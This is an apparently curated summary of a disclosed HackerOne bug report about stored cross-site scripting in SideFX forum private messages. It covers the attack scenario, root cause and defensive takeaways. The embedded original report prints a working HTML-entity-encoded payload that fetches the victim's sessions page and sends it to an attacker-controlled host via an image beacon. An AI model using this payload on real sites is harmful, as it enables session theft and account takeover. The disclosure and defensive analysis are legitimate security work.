# Stored XSS in Private Messages via HTML Entity Encoding Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 1669764 | https://hackerone.com/reports/1669764
- **Submitted:** 2022-08-15
- **Reporter:** itriedallthenamess
- **Program:** SideFX
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in the private messaging system that allows authenticated users to inject malicious JavaScript through HTML entity-encoded payloads. The vulnerability enables session hijacking by exfiltrating user session data from the /account/sessions/ page and stealing authentication credentials.

## Attack scenario
1. Attacker obtains an approved account on the SideFX forum and gains access to the messaging system
2. Attacker crafts a malicious message containing HTML-entity-encoded XSS payload that bypasses input filters
3. Victim receives and opens the message in their browser
4. The payload decodes and executes JavaScript in the victim's context with their privileges
5. JavaScript fetches the victim's active sessions page and exfiltrates session data via image beacon to attacker's server
6. Attacker uses stolen session data to impersonate the victim and access their account

## Root cause
The messaging system insufficiently sanitizes user input by failing to properly decode and validate HTML entities before rendering. The application only performs basic HTML entity encoding without preventing JavaScript execution vectors like event handlers (onerror, onload) when entities are decoded by the browser.

## Attacker mindset
An attacker seeks to compromise user accounts through a trusted communication channel (private messages). By targeting the messaging feature used by all forum members, they can conduct mass account takeovers. The use of entity encoding demonstrates knowledge of basic WAF/filter bypass techniques.

## Defensive takeaways
- Implement strict Content Security Policy (CSP) headers to prevent inline script execution
- Use parameterized/safe DOM APIs (textContent instead of innerHTML) for message rendering
- Apply context-aware output encoding: HTML encode for HTML context, JavaScript encode for JS context
- Implement server-side input validation against XSS payloads, not just entity encoding
- Sanitize using established libraries (DOMPurify, bleach) rather than custom filtering
- Implement session binding to IP/User-Agent to prevent stolen session abuse
- Apply httpOnly and Secure flags to session cookies to limit exfiltration vectors
- Conduct security review of all user-controlled input fields, especially messaging features

## Variant hunting
Search for similar stored XSS in: forum posts, user profiles/bios, comments, notifications, email templates, file descriptions, collaborative document features. Test entity-encoding bypass in any rich-text or message rendering system.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1566.002 - Phishing: Spearphishing Link
- T1539 - Steal Web Session Cookie
- T1602.002 - Data from Information Repositories

## Notes
The reporter demonstrated sophisticated understanding by weaponizing XSS for session theft rather than simple alerts. The attack leverages trust in the messaging system and requires minimal account approval barrier. The use of base64 encoding in exfiltration shows anti-logging awareness. This is a well-executed report with clear reproduction steps and proof-of-concept payload.

## Full report
<details><summary>Expand</summary>

## Summary:
I have researched availabilities for XSS attacks and i found it in messages.
You should be authorized for this and approved by admin. 
To do this, you just need to make a post on the forum, which I did as the first step.

I was able to steal the session ID of the victim account (my second test account) and log in using it.
A session cannot be stolen via cookies, but the user has a page https://www.sidefx.com/account/sessions/. I sent a request to this page through the victim's account, and then inserted an image on the page with a link to my site. As a get parameter, I specified an html response encoded in base64``<img src=http://mysite.com?q={HTML}>``. It works even without a certificate

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Your account must be approved to be able to send messages
  1. Send message for some user (I sent messages to myself and my second test account). Message content ``https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxx&quotonerror=&quotalert&#40&#39XSS&#39&#41&quot&gt``
  1. Open a received or just sent message. You will see `alert` message

## Supporting Material/References:
My payload for getting session:
``https://example.com/&quot&gtsadf&lt/a&gt&ltimg&#32src=&quotxxx&quotonerror=&quotfetch&#40&#39https&#58&#47&#47www.sidefx.com/account/sessions&#39&#41.then&#40response=&gt&#123response.text&#40&#41.then&#40ddd=&gt&#123let&#32el=document.createElement&#40&#39img&#39&#41&#59el.src=&#39http&#58&#47&#47myfakesite.com?q=&#39&#43btoa&#40encodeURIComponent&#40ddd&#41&#41&#59document.body.appendChild&#40el&#41&#125&#41&#125&#41&quot&gt``

## Impact

This is a really critical vulnerability, because the site has a list of forum users (https://www.sidefx.com/forum/users/) and such a load can be sent to each user

</details>

---
*Analysed by Claude on 2026-05-12*
